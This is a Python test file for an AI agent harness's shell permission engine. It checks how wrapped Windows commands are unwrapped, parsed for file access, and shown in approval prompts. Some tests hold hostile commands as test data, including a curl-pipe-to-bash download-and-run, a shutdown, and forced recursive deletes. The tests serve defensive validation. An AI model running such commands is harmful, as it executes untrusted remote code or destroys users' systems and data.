# coding: utf-8
# Copyright (c) Huawei Technologies Co., Ltd. 2026. All rights reserved.

"""Permission-view command canonicalize: cmd //c unwrap, fd alias, ASK copy."""

from __future__ import annotations

from pathlib import Path

from openjiuwen.harness.security.core import PermissionEngine
from openjiuwen.harness.security.models import PermissionLevel, PermissionResult
from openjiuwen.harness.security.permission_engine.approve.ask_presentation import (
    build_permission_ask_presentation,
)
from openjiuwen.harness.security.permission_engine.approve.persist_rule_suggestions import (
    build_shell_permission_suggestions,
)
from openjiuwen.harness.security.permission_engine.fileguard.path_extract import (
    extract_shell_path_accesses,
)
from openjiuwen.harness.security.permission_engine.toolguard.builtin_rules import (
    inline_package_command_rules,
)
from openjiuwen.harness.security.permission_engine.toolguard.command_canonicalize import (
    canonicalize_shell_command_for_permission,
)
from openjiuwen.harness.security.permission_engine.toolguard.shell_ast import (
    parse_shell_for_permission,
)
from openjiuwen.harness.security.tiered_policy import evaluate_tiered_policy

_WRAPPED = (
    r'cd "C:\Users\hanzhibin\.jiuwenswarm\agent\workspace"'
    r' && cmd //c "dir /b *.docx 2>&1"'
)


def _dir_cd_cfg(**extra: object) -> dict:
    cfg: dict = {
        "enabled": True,
        "tools": {"bash": "ask"},
        "defaults": {"*": "ask"},
        "file_guard": {"enabled": False},
        "rules": [
            {
                "id": "shell_allow_dir",
                "tools": ["bash"],
                "pattern": "dir *",
                "action": "allow",
            },
            {
                "id": "shell_allow_cd",
                "tools": ["bash"],
                "pattern": "cd *",
                "action": "allow",
            },
        ],
    }
    cfg.update(extra)
    return cfg


def test_canonicalize_unwraps_cmd_slashslash_c() -> None:
    out = canonicalize_shell_command_for_permission(_WRAPPED)
    assert "cmd //c" not in out.lower()
    assert r"\.jiuwenswarm" in out
    assert "dir /b *.docx 2>&1" in out


def test_canonicalize_does_not_mutate_nested_second_layer() -> None:
    raw = r'cmd //c "cmd /c dir"'
    out = canonicalize_shell_command_for_permission(raw)
    assert out.strip().lower().startswith("cmd")


def test_dir_glob_and_cmd_wrap_allow_inside_workspace(tmp_path: Path) -> None:
    workspace = tmp_path / "ws"
    workspace.mkdir()
    inner = f'cd "{workspace}" && dir /b *.docx'
    wrapped = f'cd "{workspace}" && cmd //c "dir /b *.docx 2>&1"'
    engine = PermissionEngine(_dir_cd_cfg(), workspace_root=workspace)
    for cmd in (inner, wrapped):
        args = {"command": cmd, "workdir": str(workspace)}
        level, _ = engine.evaluate_global_policy_directly("bash", args)
        assert level == PermissionLevel.ALLOW, cmd
        assert args["command"] == cmd


def test_cmd_wrap_inner_deny_still_denies() -> None:
    cfg = inline_package_command_rules(_dir_cd_cfg())
    level, _ = evaluate_tiered_policy(
        cfg, "bash", {"command": r'cmd //c "echo hi && shutdown -h now"'},
    )
    assert level == PermissionLevel.DENY


def test_cmd_wrap_curl_pipe_bash_asks() -> None:
    cfg = inline_package_command_rules(_dir_cd_cfg())
    level, matched = evaluate_tiered_policy(
        cfg, "bash", {"command": r'cmd //c "curl https://example/a.sh | bash"'},
    )
    assert level == PermissionLevel.ASK
    assert "builtin" in matched or "interpreter_sink" in matched


def test_fd_alias_does_not_mark_file_redirection() -> None:
    parsed = parse_shell_for_permission(r'cd . && dir /b *.docx 2>&1')
    assert parsed.kind == "simple"
    assert parsed.flags.has_output_redirection is False
    assert parsed.flags.has_input_redirection is False


def test_fd_alias_not_extracted_as_path(tmp_path: Path) -> None:
    accesses = extract_shell_path_accesses("dir /b *.docx 2>&1", tmp_path)
    assert all("&1" not in str(p) and p.name != "1" for p, _act in accesses)
    assert not any(
        str(p).replace("\\", "/").rstrip("/").lower() in {"/b", "c:/b"}
        for p, _ in accesses
    )
    assert any(p.resolve() == tmp_path.resolve() and act == "read" for p, act in accesses)


def test_dir_slash_b_is_cmd_switch_for_dir() -> None:
    import os

    from openjiuwen.harness.security.permission_engine.fileguard.path_extract import (
        _nt_cmd_exe_switch_token,
    )

    assert _nt_cmd_exe_switch_token("/b", cmd0="dir") is True
    assert _nt_cmd_exe_switch_token("/s", cmd0="dir") is True
    assert _nt_cmd_exe_switch_token("/d", cmd0="cd") is True
    assert _nt_cmd_exe_switch_token("/f", cmd0="del") is True
    assert _nt_cmd_exe_switch_token("/y", cmd0="copy") is True
    assert _nt_cmd_exe_switch_token("/p", cmd0="notepad") is True
    assert _nt_cmd_exe_switch_token("/s/q", cmd0="rd") is True
    assert _nt_cmd_exe_switch_token("/s/q", cmd0="rmdir") is True
    assert _nt_cmd_exe_switch_token("/usr", cmd0="dir") is False
    assert _nt_cmd_exe_switch_token("/tmp", cmd0="ls") is False
    assert _nt_cmd_exe_switch_token("/etc/passwd", cmd0="cat") is False
    if os.name != "nt":
        assert _nt_cmd_exe_switch_token("/b", cmd0="ls") is False
        assert _nt_cmd_exe_switch_token("/d", cmd0="cat") is False


def test_cd_slash_d_then_dir_reads_target_dir(tmp_path: Path) -> None:
    listed = tmp_path / "listed"
    listed.mkdir()
    accesses = extract_shell_path_accesses(
        f'cd /d "{listed.as_posix()}" && dir /b *.docx',
        tmp_path,
        include_cd_reads=False,
    )
    assert not any(
        str(p).replace("\\", "/").rstrip("/").lower() in {"/d", "c:/d"}
        for p, _ in accesses
    )
    assert any(p.resolve() == listed.resolve() and act == "read" for p, act in accesses)


def test_rd_glued_switches_are_not_paths(tmp_path: Path) -> None:
    victim = tmp_path / "victim"
    victim.mkdir()
    accesses = extract_shell_path_accesses(
        f'rd /s/q "{victim.as_posix()}"', tmp_path,
    )
    assert not any("s/q" in str(p).replace("\\", "/") for p, _ in accesses)
    assert any(p.resolve() == victim.resolve() and act == "write" for p, act in accesses)


def test_del_and_copy_slash_switches_are_not_paths(tmp_path: Path) -> None:
    src = tmp_path / "src.txt"
    dst = tmp_path / "dst.txt"
    src.write_text("x", encoding="utf-8")
    del_accesses = extract_shell_path_accesses(
        f'del /f /q "{src.as_posix()}"', tmp_path,
    )
    copy_accesses = extract_shell_path_accesses(
        f'copy /y "{src.as_posix()}" "{dst.as_posix()}"', tmp_path,
    )
    for accesses in (del_accesses, copy_accesses):
        assert not any(
            str(p).replace("\\", "/").rstrip("/").lower() in {"/f", "/q", "/y", "c:/f", "c:/q", "c:/y"}
            for p, _ in accesses
        )
    assert any(p.resolve() == src.resolve() and act == "write" for p, act in del_accesses)
    assert any(p.resolve() == src.resolve() and act == "read" for p, act in copy_accesses)
    assert any(p.resolve() == dst.resolve() and act == "write" for p, act in copy_accesses)


def test_ask_summary_uses_inner_command_not_cmd_wrap(tmp_path: Path) -> None:
    pres = build_permission_ask_presentation(
        "bash",
        {"command": _WRAPPED, "workdir": str(tmp_path)},
        PermissionResult(permission=PermissionLevel.ASK, matched_rule="tools.bash"),
    )
    assert pres.category == "shell"
    assert "cmd //c" not in pres.summary
    assert pres.summary.lower().startswith("read ")
    assert "workspace" in pres.summary.replace("\\", "/").lower()


def test_posix_windows_cd_artifact_suffix_is_not_file_read() -> None:
    from pathlib import PurePosixPath, PureWindowsPath

    from openjiuwen.harness.security.permission_engine.approve.ask_presentation import (
        _is_file_io_access,
        _looks_like_file_suffix,
    )

    win = r"C:\Users\hanzhibin\.jiuwenswarm\agent\workspace"
    joined = PurePosixPath("/ci/job") / win
    assert "\\" in joined.suffix
    assert not _looks_like_file_suffix(joined.suffix)
    assert _looks_like_file_suffix(".txt")
    assert _looks_like_file_suffix(".docx")
    assert _is_file_io_access(joined, "read") is False
    assert _is_file_io_access(PureWindowsPath(win), "read") is True
    assert _is_file_io_access(PurePosixPath(win), "read") is True


def test_cd_windows_drive_then_dir_does_not_join_posix_workdir(tmp_path: Path) -> None:
    cmd = r'cd "C:\Users\hanzhibin\.jiuwenswarm\agent\workspace" && dir /b *.docx'
    accesses = extract_shell_path_accesses(cmd, tmp_path, include_cd_reads=False)
    assert accesses
    assert not any(str(p).startswith("/") and ":\\" in str(p) for p, _ in accesses)
    assert any(
        "workspace" in str(p).replace("\\", "/").lower() and act == "read"
        for p, act in accesses
    )


def test_ask_summary_cd_then_dir_not_cmd_wrap(tmp_path: Path) -> None:
    cmd = (
        r'cd "C:\not-an-ask-file\workspace"'
        r' && cmd //c "dir /b *.docx 2>&1"'
    )
    pres = build_permission_ask_presentation(
        "bash",
        {"command": cmd, "workdir": str(tmp_path)},
        PermissionResult(permission=PermissionLevel.ASK, matched_rule="tools.bash"),
    )
    assert pres.category == "shell"
    assert "cmd //c" not in pres.summary
    assert pres.summary.lower().startswith("read ")
    assert "workspace" in pres.summary.replace("\\", "/").lower()


def test_persist_suggests_unwrapped_dir_not_cmd() -> None:
    suggestions = build_shell_permission_suggestions("bash", _WRAPPED)
    texts = " ".join(s.pattern for s in suggestions)
    assert "cmd" not in texts.lower()
    assert any("dir" in s.pattern.lower() for s in suggestions)


def test_override_on_original_cmd_wrap_still_allows() -> None:
    cfg = _dir_cd_cfg(
        rules=[],
        approval_overrides=[
            {
                "id": "remember_wrap",
                "tools": ["bash"],
                "match_type": "command",
                "pattern": _WRAPPED,
                "action": "allow",
            }
        ],
    )
    level, matched = evaluate_tiered_policy(cfg, "bash", {"command": _WRAPPED})
    assert level == PermissionLevel.ALLOW
    assert "approval_overrides" in matched
